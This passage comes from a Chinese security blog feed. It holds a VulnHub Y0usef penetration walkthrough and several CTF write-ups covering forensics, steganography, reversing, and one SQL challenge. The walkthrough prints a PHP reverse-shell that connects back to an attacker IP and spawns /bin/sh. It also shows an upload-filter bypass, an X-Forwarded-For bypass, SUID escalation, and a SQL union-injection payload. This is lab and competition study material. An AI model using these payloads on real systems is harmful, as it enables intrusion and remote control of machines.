CPUs&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;1 virtual CPU&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;1&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceType&gt;3&lt;/rasd:ResourceType&gt;        &lt;rasd:VirtualQuantity&gt;1&lt;/rasd:VirtualQuantity&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AllocationUnits&gt;MegaBytes&lt;/rasd:AllocationUnits&gt;        &lt;rasd:Caption&gt;1024 MB of memory&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Memory Size&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;1024 MB of memory&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;2&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceType&gt;4&lt;/rasd:ResourceType&gt;        &lt;rasd:VirtualQuantity&gt;1024&lt;/rasd:VirtualQuantity&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;0&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;ideController0&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;IDE Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;ideController0&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;3&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;PIIX4&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;5&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;1&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;ideController1&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;IDE Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;ideController1&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;4&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;PIIX4&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;5&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:Address&gt;0&lt;/rasd:Address&gt;        &lt;rasd:Caption&gt;sataController0&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;SATA Controller&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;sataController0&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;5&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;AHCI&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;20&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AddressOnParent&gt;0&lt;/rasd:AddressOnParent&gt;        &lt;rasd:Caption&gt;disk1&lt;/rasd:Caption&gt;        &lt;rasd:Description&gt;Disk Image&lt;/rasd:Description&gt;        &lt;rasd:ElementName&gt;disk1&lt;/rasd:ElementName&gt;        &lt;rasd:HostResource&gt;/disk/vmdisk1&lt;/rasd:HostResource&gt;        &lt;rasd:InstanceID&gt;7&lt;/rasd:InstanceID&gt;        &lt;rasd:Parent&gt;5&lt;/rasd:Parent&gt;        &lt;rasd:ResourceType&gt;17&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AutomaticAllocation&gt;true&lt;/rasd:AutomaticAllocation&gt;        &lt;rasd:Caption&gt;Ethernet adapter on &#39;NAT&#39;&lt;/rasd:Caption&gt;        &lt;rasd:Connection&gt;NAT&lt;/rasd:Connection&gt;        &lt;rasd:ElementName&gt;Ethernet adapter on &#39;NAT&#39;&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;8&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;E1000&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;10&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;    &lt;/VirtualHardwareSection&gt;  &lt;/VirtualSystem&gt;&lt;/Envelope&gt;</code></pre><p>在直接双击ovf文件 使用vmware打开 正常导入就可以了</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>给的靶机是一个图形化页面的ubuntu 但是貌似打不开终端 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131700533.png" alt="image-20241113170019100"></p><p>我们还是按照流程一点点来</p><h4 id="扫ip"><a href="#扫ip" class="headerlink" title="扫ip"></a>扫ip</h4><p>nmap扫到靶场ip是192.168.64.140</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131701170.png" alt="image-20241113170116983"></p><h4 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h4><p>继续扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131706546.png" alt="image-20241113170624479"></p><h4 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h4><p>用whatweb先看一下靶机网站 没有什么特别有用的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132120196.png" alt="image-20241113212034948"></p><p>下面进行目录扫描</p><pre><code>ython3 ./dirsearch.py -u http://192.168.64.140 -i 200 -w &#39;/home/w3nx1z1/Desktop/dict-master/DirScan/dir.txt&#39; -e ,</code></pre><p>-e参数可以扫描全部文件 不指定某特定后缀名的文件</p><p>扫出administration路由 </p><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p>我们访问靶场网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132125392.png" alt="image-20241113212512276"></p><p>在访问administration路由 但是是404</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132128364.png" alt="image-20241113212841270"></p><h4 id="XFF伪造"><a href="#XFF伪造" class="headerlink" title="XFF伪造"></a>XFF伪造</h4><p>尝试使用firefox插件 添加X-Forwarded-For请求头 成功访问登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132130665.png" alt="image-20241113213001560"></p><p>使用弱密码admin:admin登陆后台</p><p><strong><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132130476.png" alt="image-20241113213036360"></strong></p><p>找到一个文件上传功能</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132131913.png" alt="image-20241113213118853"></p><h4 id="通过文件上传反弹shell"><a href="#通过文件上传反弹shell" class="headerlink" title="通过文件上传反弹shell"></a>通过文件上传反弹shell</h4><p>基本没怎么ban 先传png文件 在修改后缀名为php即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132304644.png" alt="image-20241113230430522"></p><p>我们这里写反弹shell的php文件如下</p><pre><code class="php">&lt;?php$ip=&quot;192.168.6.160&quot;;$port=8888;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><h3 id="三、进入shell"><a href="#三、进入shell" class="headerlink" title="三、进入shell"></a>三、进入shell</h3><h4 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h4><p>先开启一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p>尝试使用find找一下flag文件 没有找到 找一下home目录 找到一个base64字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132325716.png" alt="image-20241113232501624"></p><p>解出来是yousef用户的账密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132332610.png" alt="image-20241113233209529"></p><p>那直接可以切换用户 进入shell</p><pre><code>ssh yousef@192.168.64.140 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132333909.png" alt="image-20241113233331793"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>最简单的 找一下suid提权</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132334864.png" alt="image-20241113233441741"></p><p>看到su 直接提权就完事了 然后进入到root文件夹下 有个root.txt 读取一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132337785.png" alt="image-20241113233709693"></p><p>也是base64 解一下 拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132337274.png" alt="image-20241113233740126"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场Y0usef渗透测试wp&quot;&gt;&lt;a href=&quot;#vulnhub靶场Y0usef渗透测试wp&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场Y0usef渗透测试wp&quot;&gt;&lt;/a&gt;vulnhub靶场Y0usef渗透测试wp&lt;/</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>2024数信杯北区决赛实操</title>
    <link href="http://w3nx1z1.github.io/2024/10/03/2024%E6%95%B0%E4%BF%A1%E6%9D%AF%E5%8C%97%E5%8C%BA%E5%86%B3%E8%B5%9B%E5%AE%9E%E6%93%8D/"/>
    <id>http://w3nx1z1.github.io/2024/10/03/2024%E6%95%B0%E4%BF%A1%E6%9D%AF%E5%8C%97%E5%8C%BA%E5%86%B3%E8%B5%9B%E5%AE%9E%E6%93%8D/</id>
    <published>2024-10-03T04:59:09.245Z</published>
    <updated>2024-10-03T05:00:45.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024数信杯北区决赛实操"><a href="#2024数信杯北区决赛实操" class="headerlink" title="2024数信杯北区决赛实操"></a>2024数信杯北区决赛实操</h1><p>本次比赛北区决赛第三名 学生组第一</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031225511.png" alt="image-20241003122509200"></p><h2 id="ez-sign"><a href="#ez-sign" class="headerlink" title="ez_sign"></a>ez_sign</h2><p>先爆破出密码123456</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301148745.png" alt="img"></p><p>打开看到jpg中的flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147789.png" alt="img"></p><pre><code>flag&#123;266c7354-0817</code></pre><p>流量包中找到flag2</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147791.png" alt="img"></p><pre><code>-4694-9494-</code></pre><p>给了一个part3.zip 无法正常解压 010打开查看 发现有大量FF 写个脚本和0xFF异或</p><pre><code class="python">with open(&quot;part3.zip&quot;, &#39;rb&#39;) as f:    data = f.read()xor_data = bytearray(d ^ 0xFF for d in data)with open(&quot;1.zip&quot;, &#39;wb&#39;) as f:    f.write(xor_data)</code></pre><p>正常解压压缩包 得到flag3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147954.png" alt="img"></p><pre><code>flag&#123;266c7354-0817-4694-9494-c727479d8f1a&#125; </code></pre><p>其实上面异或这一步直接在010editor里面进行也可以 记得选择无符号字节</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031214957.png" alt="image-20241003121454849"></p><p>也可以直接在赛博厨子中进行 先解hex 在进行异或</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031216661.png" alt="image-20241003121649531"></p><h2 id="签到寄语"><a href="#签到寄语" class="headerlink" title="签到寄语"></a>签到寄语</h2><p>随便写</p><p>写完用CameraFileCopy扫码 得到文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031217996.png" alt="image-20241003121741906"></p><h2 id="Secret1"><a href="#Secret1" class="headerlink" title="Secret1"></a>Secret1</h2><pre><code>小强离开电脑的时候，某人把小强的秘密给偷走了，还把文件修改覆盖了，作案脚本也删了。请帮助小强找到丢失的相关数据。1.提交加密算法工具当中的flag值。（提交示例：flag&#123;*&#125;）</code></pre><p>使用r-studio打开内存镜像 在secret文件夹下面有个pyc文件 保存出来 打开就有flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031218110.png" alt="image-20241003121804041"></p><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><pre><code>2.恢复图片中的flag值</code></pre><p>把上面的pyc文件代码逆出来</p><pre><code class="Python">def encode(png):    flag = &quot;flag&#123;eba771fd-2b03-418f-b11a-60f1141c99ee&#125;&quot;    lens = len(flag)    with open(png, &quot;rb&quot;) as f:        pic_bytes = f.read()        print(len(pic_bytes))        output_bytes = bytearray()        for i in range(0, len(pic_bytes)):            output_bytes.append(pic_bytes[i] ^ ord(flag[i * 2 % lens]))    with open(png, &quot;wb&quot;) as f:        f.write(output_bytes)</code></pre><p>filescan出来一个flag.png 保存出来 这就是被加密的图片 ai跑个脚本恢复出原图片</p><pre><code class="Python">def decode(png):    flag = &quot;flag&#123;eba771fd-2b03-418f-b11a-60f1141c99ee&#125;&quot;    lens = len(flag)    with open(png, &quot;rb&quot;) as f:        enc_bytes = f.read()        output_bytes = bytearray()        for i in range(len(enc_bytes)):            output_bytes.append(enc_bytes[i] ^ ord(flag[i * 2 % lens]))    with open(&quot;decoded_&quot; + png, &quot;wb&quot;) as f:        f.write(output_bytes)# 使用解密函数decode(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031219969.png" alt="image-20241003121948915"></p><h2 id="secret3-赛后复盘"><a href="#secret3-赛后复盘" class="headerlink" title="secret3(赛后复盘)"></a>secret3(赛后复盘)</h2><pre><code>3.提交压缩包当中的flag值。</code></pre><p>也算是学到了 一个很不常见的插件使用方式</p><p>压缩包在上一题恢复出来的图片尾部 提取出来之后 确定为真加密 开始找密码</p><p>密码在剪切板中</p><p>剪贴板插件后面加上-v参数 因为可能在明文之间有不可见字符进行隔断 这个时候仅使用clipboard就可能看不到全部明文</p><pre><code>clipboard -v </code></pre><p>下图是加不加-v参数的对比</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031257569.png" alt="image-20241003125734777"></p><p>拿到密码后 解压压缩包出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031258260.png" alt="image-20241003125808201"></p><h2 id="history1"><a href="#history1" class="headerlink" title="history1"></a>history1</h2><p>r-studio里面找到两个ipynb文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031220754.png" alt="image-20241003122015611"></p><p>使用vol导出</p><pre><code class="Python">.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 filescan | findstr &quot;.ipynb&quot;                                             ─╯Volatility Foundation Volatility Framework 2.60x000000007d843bd0     16      0 -W-rw- \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\.ipynb_checkpoints\Untitled-checkpoint.ipynb0x000000007da54b40     16      0 R--rw- \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\Untitled.ipynb.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d843bd0 -D E:\Desktop\数信杯\history            ─╯Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7d843bd0   None   \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\.ipynb_checkpoints\Untitled-checkpoint.ipynb.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007da54b40 -D E:\Desktop\数信杯\history            ─╯Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7da54b40   None   \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\Untitled.ipynb</code></pre><p>打开就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147598.png" alt="img"></p><h2 id="history2"><a href="#history2" class="headerlink" title="history2"></a>history2</h2><p>同上题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147581.png" alt="img"></p><h2 id="Pixel"><a href="#Pixel" class="headerlink" title="Pixel"></a>Pixel</h2><p>首先看到文件头提示SM4CBC sm4国密算法 CBC模式 修改为png头后 正常打开图片</p><p>尾部有密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031220259.png" alt="image-20241003122040190"></p><p>存在lsb隐写 先得到key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031221907.png" alt="image-20241003122100826"></p><p>注意这个地方是<code>1</code>不是<code>l</code>(踩大坑)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031222166.png" alt="image-20241003122224057"></p><p>zsteg得到iv</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031223312.png" alt="image-20241003122314206"></p><p>直接解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031223650.png" alt="image-20241003122337452"></p><h2 id="水印攻击-北区-990分"><a href="#水印攻击-北区-990分" class="headerlink" title="水印攻击_北区(990分)"></a>水印攻击_北区(990分)</h2><p>gpt调</p><pre><code class="Python">from PIL import Image, ImageEnhanceimport numpy as np# 打开原始图片image_path = &quot;input.png&quot;image = Image.open(image_path)# 1. 轻微调整亮度def adjust_brightness(image, factor=1.05):    enhancer = ImageEnhance.Brightness(image)    return enhancer.enhance(factor)# 2. 添加轻微的高斯噪声def add_noise(image, mean=0, var=0.001):    img_array = np.asarray(image)    row, col, ch = img_array.shape    sigma = 0.0003    gauss = np.random.normal(mean, sigma, (row, col, ch))    noisy_img = img_array + gauss * 255    noisy_img = np.clip(noisy_img, 0, 255).astype(np.uint8)    return Image.fromarray(noisy_img)# 3. 叠加轻微的掩码块def add_mask_block(image, block_size=5, opacity=0.1):    img_array = np.array(image)    mask = np.zeros_like(img_array)    h, w, _ = img_array.shape    start_h = np.random.randint(0, h - block_size)    start_w = np.random.randint(0, w - block_size)    mask[start_h:start_h + block_size, start_w:start_w + block_size] = (255, 255, 255)    final_img = (1 - opacity) * img_array + opacity * mask    final_img = np.clip(final_img, 0, 255).astype(np.uint8)    return Image.fromarray(final_img)# 应用以上步骤对图像进行处理image = adjust_brightness(image, factor=1.1) # 轻微提高亮度image = add_noise(image, mean=0, var=0.0005)  # 添加轻微噪声# 保存处理后的图片image.save(&quot;result.png&quot;)</code></pre><h2 id="Ezsql"><a href="#Ezsql" class="headerlink" title="Ezsql"></a>Ezsql</h2><p>联合注入 先闭合前面的sql查询语句 后面根据题目描述 查询whatisthis表中的flag</p><pre><code class="Python">name=1&#39;) union all select 1,flag,3 FROM whatisthis--+</code></pre><h2 id="easy-decode"><a href="#easy-decode" class="headerlink" title="easy-decode"></a>easy-decode</h2><p>对main函数计算md5，动调有问题，不同工具结果都不同，比较新颖的反调试</p><p>idapython直接算</p><pre><code class="Python">import hashlibimport ida_bytes# 指定的起始地址（替换为有效的起始地址）start_addr = 0x7FF721E11000# 要读取的长度length = 0x7D0# 读取字节数据byte_values = [ida_bytes.get_byte(start_addr + i) for i in range(length)]# 将字节数组转换为字节串（bytes）byte_data = bytes(byte_values)# 计算MD5哈希值md5_hash = hashlib.md5(byteS_data).hexdigest()# 打印MD5哈希值print(&quot;MD5:&quot;, md5_hash)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031224720.png" alt="image-20241003122429607"></p><p>厨子解aes，iv全零</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147392.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024数信杯北区决赛实操&quot;&gt;&lt;a href=&quot;#2024数信杯北区决赛实操&quot; class=&quot;headerlink&quot; title=&quot;2024数信杯北区决赛实操&quot;&gt;&lt;/a&gt;2024数信杯北区决赛实操&lt;/h1&gt;&lt;p&gt;本次比赛北区决赛第三名 学生组第一&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2024羊城杯MISC方向wp</title>
    <link href="http://w3nx1z1.github.io/2024/08/28/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E6%96%B9%E5%90%91wp/"/>
    <id>http://w3nx1z1.github.io/2024/08/28/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E6%96%B9%E5%90%91wp/</id>
    <published>2024-08-28T13:46:47.290Z</published>
    <updated>2024-08-28T13:47:15.956Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024羊城杯MISC方向wp"><a href="#2024羊城杯MISC方向wp" class="headerlink" title="2024羊城杯MISC方向wp"></a>2024羊城杯MISC方向wp</h1><p>真是叹为观止的一场比赛 见识到众多本科组ctf大手子们熬夜上分 最后半小时神仙打架 最后一分钟疯狂交题更是让在下大开眼界 </p><p>但是苦于没有队友 只能自己浅做一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281606294.png" alt="image-20240828160658179"></p><h2 id="不一样的数据库-2"><a href="#不一样的数据库-2" class="headerlink" title="不一样的数据库_2"></a>不一样的数据库_2</h2><p>附件拿到一个压缩包 真加密 010打开 翻到最下面 找到提示 密码是6位数字</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281609396.png" alt="image-20240828160902327"></p><p>爆破一下密码 为<code>753951</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281609493.png" alt="image-20240828160930428"></p><p>解压得到一张残缺的二维码和一个kdbx的Keepass数据库 先修复二维码 这个很好弄 就是补全三个定位点就可以了</p><p>直接截一个正常二维码的定位点 然后用PS粘上去就可以扫</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281617426.png" alt="image-20240828161721363"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281618936.png" alt="image-20240828161820866"></p><p>得到<code>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</code></p><p>使用Keepass打开数据库 需要输入密码 但是发现直接输入上面扫出来的字符串不能直接解密 发现给的附件中的残缺二维码的名字是13 联想到rot13 解密一下得到<code>AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281628267.png" alt="image-20240828162807192"></p><p>成功打开数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281628359.png" alt="image-20240828162847235"></p><p>先看到一个<code>passisDASCTF</code>  同时看到群组名字是AES 那下面就是找一下密文 </p><h3 id="查看编辑记录"><a href="#查看编辑记录" class="headerlink" title="查看编辑记录"></a>查看编辑记录</h3><p>右击选择编辑记录 可以找到修改密码记录的历史 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281636863.png" alt="image-20240828163642789"></p><p>选择最后面两条记录的任意一条 选择<code>高级</code> 可以看到一个字段名为<code>aes</code>就是密文 值有很明显的<code>U2Fsd</code>AES加密头 直接使用密码进行AES解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281638684.png" alt="image-20240828163849623"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281640368.png" alt="image-20240828164012316"></p><h2 id="so-much"><a href="#so-much" class="headerlink" title="so+much"></a>so+much</h2><p>原题 没什么好说的 拿到的ad1镜像文件 名字为<code>c2hpZnQh</code>  解base64是<code>shift! </code></p><p>使用010打开 发现有提示 和<code>123456</code> 结合shift 可以想到密码是按住shift键的123456 也就是<code>!@#$%^</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281641657.png" alt="image-20240828164137592"></p><p>解密ad1镜像文件 使用FTK imager  File——Decrypt AD1 image 得到解密后的<code>c2hpZnQh-decrypted.ad1</code> 在使用FTK进行挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281656295.png" alt="image-20240828165614222"></p><p>打开挂载上的镜像 发现很多<code>.crypto</code>文件 同时时间戳只有两种 猜测是转二进制 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281658327.png" alt="image-20240828165833261"></p><p>因为挂载的时候是只读模式 我们需要把这些文件都先单独复制出来 写脚本 先提取时间戳 可以发现时间少的是<code>1628151585.73009</code> 因此转化为0 反之则为1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281700567.png" alt="image-20240828170014520"></p><pre><code class="python">import oslist = [&#39;&#39;]*344i = 0for j in range(344):    list[j] = os.path.getmtime(str(j)+&#39;.crypto&#39;)# print(list)flag = &#39;&#39;for i in range(344):    if(str(list[i]) == &#39;1628151585.73009&#39;):        flag += &#39;0&#39;    else:        flag += &#39;1&#39;print(flag)tmp = &#39;&#39;for k in range(len(flag)):    tmp += flag[k]    if len(tmp) == 8:        print(chr(int(tmp,2)),end=&#39;&#39;)        tmp = &#39;&#39;        # the_key_is_700229c053b4ebbcf1a3cc37c389c4fa</code></pre><p>得到解密crypto文件的密码是<code>700229c053b4ebbcf1a3cc37c389c4fa</code>  解密需要的工具是<code>Encrypto </code> 我们只需要找两个时间戳不一样的文件进行解密就可以了  两个文件内容拼起来就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281703623.png" alt="image-20240828170309574"></p><h2 id="hiden"><a href="#hiden" class="headerlink" title="hiden"></a>hiden</h2><p>附件一个wav文件 一个需要解密内容的文件 文件名<code>60=()+()</code> 直接猜测是13+47 需要进行rot47+rot13解密</p><p>得到加密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281706170.png" alt="image-20240828170653049"></p><pre><code class="python">import wave with open(&#39;flag.txt&#39;, &#39;rb&#39;) as f:    txt_data = f.read()    file_len = len(txt_data)    txt_data = file_len.to_bytes(3, byteorder = &#39;little&#39;) + txt_datawith wave.open(&quot;test.wav&quot;, &quot;rb&quot;) as f:    attrib = f.getparams()        wav_data = bytearray( f.readframes(-1) )for index in range(len(txt_data)):    wav_data[index * 4] = txt_data[index]    with wave.open(&quot;hiden.wav&quot;, &quot;wb&quot;) as f:    f.setparams(attrib)     f.writeframes(wav_data)</code></pre><p>直接ai跑个解密脚本 就能提取出flag.txt的内容</p><pre><code class="python">import wave# 打开hiden.wav文件with wave.open(&quot;hiden.wav&quot;, &quot;rb&quot;) as f:    # 获取音频参数    num_frames = f.getnframes()    wav_data = bytearray(f.readframes(num_frames))# 提取隐藏的内容hidden_data = bytearray()length_of_hidden_data = 0# 先提取长度for index in range(3):    hidden_data.append(wav_data[index * 4])# 得到隐藏数据的长度length_of_hidden_data = int.from_bytes(hidden_data[:3], byteorder=&#39;little&#39;)# 提取隐藏的文本数据hidden_data = bytearray()for index in range(length_of_hidden_data):    hidden_data.append(wav_data[(index + 3) * 4])  # 继续提取，跳过长度的部分# 将提取的内容写入flag.txtwith open(&#39;extracted_flag.txt&#39;, &#39;wb&#39;) as f:    f.write(hidden_data)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281708578.png" alt="image-20240828170805516"></p><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>在附件压缩包中找到一条注释</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281721518.png" alt="image-20240828172100396"></p><p>解一下 是base58 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281721503.png" alt="image-20240828172140427"></p><p>只给了一个txt文件 是16进制 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281717828.png" alt="image-20240828171746771"></p><p>放到010中 发现是一个流量包 单独保存出来进行分析 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281718443.png" alt="image-20240828171843381"></p><p>很多TLS 找办法找到解密日志 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281719729.png" alt="image-20240828171934648"></p><p>txt文档中存在wbstego隐写 密码就使用上面注释解出来的 导出来的文件保存为<code>1.log</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281727476.png" alt="image-20240828172703379"></p><p>将这个解密日志 导入到流量包中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281732672.png" alt="image-20240828173249610"></p><p>成功解密 追踪http流 找到一个flag.gif </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281733626.png" alt="image-20240828173356544"></p><p>提取出来 先分析一波帧间隔 很好 有规律 也是转二进制 小的是0 大的是1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281734852.png" alt="image-20240828173432763"></p><p>解一下二进制 出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281734768.png" alt="image-20240828173458686"></p><h2 id="miaoro"><a 